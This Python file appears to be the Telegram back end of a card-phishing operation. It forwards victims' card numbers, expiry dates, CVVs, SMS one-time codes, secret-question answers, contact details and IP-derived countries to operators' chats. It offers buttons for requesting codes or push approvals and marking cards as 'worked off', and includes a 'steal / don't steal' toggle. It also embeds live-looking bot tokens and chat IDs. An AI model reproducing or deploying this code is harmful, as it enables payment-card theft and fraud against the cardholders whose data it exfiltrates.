from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot
from parserBIN import Bin
import requests
API_TOKEN = '7183115873:AAGsfeV2XA-QeeURJsWu1IyylJ1a5yCOJkM'
api = '7079516897:AAEXE05Pvs7RXawn8CLitptBwSxk75UUbZw'
from telegram.error import TelegramError
def escape_reserved_characters(text):
    # Список зарезервированных символов, которые нужно экранировать
    reserved_characters = ['_', '[', ']', '(', ')', '~', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
     
    # Экранируем каждый зарезервированный символ
    for char in reserved_characters:
        text = text.replace(char, f'\\{char}')
    
    return text
def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button_code'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button_push'),
            InlineKeyboardButton("💳Incorrect💳", callback_data='button_incorrect_card'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🌏: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
    bot.send_message(chat_id=CHAT_ID, text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')

def send_me1(card, date, cvv, ID):
    bot = Bot(token=api)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button_code'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
            InlineKeyboardButton("💳Incorrect💳", callback_data='button4'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}` \n\n🏦 {Bin(card)[0]}\n🌏 {Bin(card)[1]}')
    bot.send_message(chat_id='-4231677984', text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')

def send_sms1(card, sms, ID, ip):
    bot = Bot(token=api)
    keyboard = [
        [
            InlineKeyboardButton("✅Отработан✅", callback_data='button-ban'),
            InlineKeyboardButton("Error SMS", callback_data='button2'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id='-4231677984', text=escape_reserved_characters(f'№{ID}\n💳  `{card}`\n💬  `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}'), reply_markup=reply_markup, parse_mode='MarkdownV2')

def send_me(CHAT_ID, card, date, cvv, ID, ip):
    bot = Bot(token=API_TOKEN)
    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
    bot.send_message(chat_id=CHAT_ID, text=text, parse_mode='MarkdownV2')
    
def send_secret_question(CHAT_ID, card, date, cvv, question, ID, name):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button1'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
            InlineKeyboardButton("❓Incorrect❓", callback_data='button5'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n❓  `{question}` '.replace('.', '\.'), reply_markup=reply_markup, parse_mode='MarkdownV2')

def send_sms(CHAT_ID, card, date, cvv, sms, ID, ip):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("✅Отработан✅", callback_data='button-ban'),
            InlineKeyboardButton("Error SMS", callback_data='button2'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)} \nSMS <3'), reply_markup=reply_markup, parse_mode='MarkdownV2')

def ne_pizdabol(card, chat_id='-4150791967'):
    try:
        bot = Bot(token=API_TOKEN)
        message = f'{card}'
        bot.send_message(chat_id=chat_id, text=message)
        print("Message sent successfully")
    except TelegramError as e:
        print(f"Failed to send message: {e}")

def cheltut(ip,name):
    try:
        chat_id='-4150791967'
        bot = Bot(token=API_TOKEN)
        message = escape_reserved_characters(f'Чувак зашел\n👮🏿‍♂️: {ip}\n🌏: `{get_country_by_ip(ip)}`\n🏷: `{name}`')
        bot.send_message(chat_id=chat_id, text=message, parse_mode='MarkdownV2')
    except TelegramError as e:
        print(f"Failed to send message: {e}")


def cheltut1(ip,name):
    bot = Bot(token=api)
    chat_id='6679500406'
    keyboard = [
        [
            InlineKeyboardButton("SEND ME", callback_data='button-me'),
        ],
    ]
    message = escape_reserved_characters(f'Чувак зашел\n👮🏿‍♂️: {ip}\n🌏: `{get_country_by_ip(ip)}`\n🏷: `{name}`')
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=chat_id, text=message, reply_markup=reply_markup, parse_mode='MarkdownV2')


def get_country_by_ip(ip_address):
    # URL для доступа к ip-api.com
    url = f'http://ip-api.com/json/{ip_address}?lang=en'

    try:
        # Отправка запроса к API
        response = requests.get(url)
        response.raise_for_status()  # Проверка на наличие ошибок в запросе

        # Преобразование ответа в формат JSON
        data = response.json()

        # Извлечение информации о стране
        country = data.get('country', 'Unknown')

        return country

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return 'Unknown'

def send_q():
    bot = Bot(token=api)
    keyboard = [
        [
            InlineKeyboardButton("пиздить", callback_data='re1'),
            InlineKeyboardButton("НЕ ПИЗДИТЬ", callback_data='re2'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id='6679500406', text=escape_reserved_characters(f'1111111111'.replace('.', '\.')), reply_markup=reply_markup, parse_mode='MarkdownV2')
